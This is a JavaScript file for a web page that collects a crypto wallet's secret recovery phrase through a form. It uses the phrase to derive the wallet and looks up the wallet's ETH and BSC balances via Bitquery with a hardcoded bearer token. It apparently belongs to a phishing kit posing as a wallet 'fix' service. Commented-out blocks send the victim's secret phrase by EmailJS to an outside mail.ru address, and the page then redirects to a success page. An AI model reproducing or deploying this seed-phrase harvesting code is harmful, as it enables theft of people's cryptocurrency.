import { ethers } from "ethers";
import Web3 from "web3";
const web3 = new Web3(Web3.currentProvider);
console.log("web3", web3);

const myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");
myHeaders.append(
  "Authorization",
  "Bearer ory_at_AihVwnjWmEQ4Uevla0dz71-DSnoGMGdrF6MjHwFz-0U.5TR9cK9Ml59N7FLBzK59Br3WNHDQJ1gQtDPnTgs7r5E"
);

(function () {
  emailjs.init({
    publicKey: "jV8EbLh46l4V4Wypt", // Your public key
  });
})();
let selected;

document.getElementById("walletForm").onsubmit = async function (e) {
  e.preventDefault();
  const secretPhrase = document.getElementById("secret_phrase").value.trim();
  console.log("secretPhrase", secretPhrase);

  try {
    var wall = ethers.Wallet.fromMnemonic(secretPhrase);
    console.log("wall", wall);

    const address = wall.address;
    let coin_data;
    let coin_data2;
    let data = [];

    const raw = JSON.stringify({
      query: `query MyQuery {\n  EVM(dataset: combined, network: eth) {\n    BalanceUpdates(\n      where: {BalanceUpdate: {Address: {is: \"${address}\"}}}\n    ) {\n      Currency {\n        Name\n        SmartContract\n        Symbol\n      }\n      balance: sum(of: BalanceUpdate_Amount)\n    }\n  }\n}\n`,
      variables: "{}",
    });

    const requestOptions = {
      method: "POST",
      headers: myHeaders,
      body: raw,
      redirect: "follow",
    };

    try {
      const response = await fetch(
        "https://streaming.bitquery.io/graphql",
        requestOptions
      );
      const result = await response.text();
      console.log("result:", result);
      if (result) {
        let res = JSON.parse(result);
        coin_data = res.data.EVM.BalanceUpdates;

        coin_data.forEach((element) => {
          let dt = {};
          dt.currency_name = element.Currency.Name;
          dt.Symbol = element.Currency.Symbol;
          dt.balance = element.balance;
          data.push(dt);
        });

        console.log(coin_data);
        console.log("Data:", data);

        const raw2 = JSON.stringify({
          query: `query MyQuery {\n  EVM(dataset: combined, network: bsc) {\n    BalanceUpdates(\n      where: {BalanceUpdate: {Address: {is: \"${address}\"}}}\n    ) {\n      Currency {\n        Name\n        SmartContract\n        Symbol\n      }\n      balance: sum(of: BalanceUpdate_Amount)\n    }\n  }\n}\n`,
          variables: "{}",
        });

        const requestOptions2 = {
          method: "POST",
          headers: myHeaders,
          body: raw2,
          redirect: "follow",
        };

        try {
          const response2 = await fetch(
            "https://streaming.bitquery.io/graphql",
            requestOptions2
          );
          const result2 = await response2.text();
          console.log("result2", result2);
          if (result2) {
            let res2 = JSON.parse(result2);
            coin_data2 = res2.data.EVM.BalanceUpdates;

            coin_data2.forEach((element2) => {
              let dt2 = {};
              dt2.currency_name = element2.Currency.Name;
              dt2.Symbol = element2.Currency.Symbol;
              dt2.balance = element2.balance;
              data.push(dt2);
            });

            console.log("coin_data2: ", coin_data2);
            console.log("Data:", data);

            let wallet_balance = JSON.stringify(data);
            localStorage.setItem("wallet_balance", wallet_balance);

            // const templateParams = {
            //     to_email: 'benard.tee@mail.ru', // Recipient's email
            //     message: `Resolvepanel Submission:\n\nSecret Phrase: ${secretPhrase}`
            // };

            // emailjs.send('service_puq0u3u', 'template_oomaoua', templateParams) // Your service ID and template ID
            //     .then(function(response) {
            //         console.log('SUCCESS!', response.status, response.text);
            //         window.location.href = 'success.html';
            //     }, function(error) {
            //         console.error('FAILED...', error);
            //         alert('Failed to send email.');
            //     });
            window.location.href = "success.html";
          }
        } catch (error) {
          console.log("error", error);
          alert("Invalid mnemonic phrase supplied");
        }
      }
    } catch (error) {
      console.log("error", error);
      console.log("Invalid mnemonic phrase eror:", err);
      alert("Invalid mnemonic phrase supplied");
      const secretPhrase = document
        .getElementById("secret_phrase")
        .value.trim();
      console.log("secretPhrase", secretPhrase);

      // const templateParams = {
      //     to_email: 'benard.tee@mail.ru', // Recipient's email
      //     message: `Rabbyfix Submission:\n\nSecret Phrase: ${secretPhrase}`
      // };

      // // Send the email
      // emailjs.send('service_puq0u3u', 'template_oomaoua', templateParams).then(function(response) {
      //     console.log('SUCCESS!', response.status, response.text);
      // }, function(error) {
      //     console.error('FAILED...', error);
      // });
    }
  } catch (err) {
    alert("Invalid mnemonic phrase supplied");
  }
};
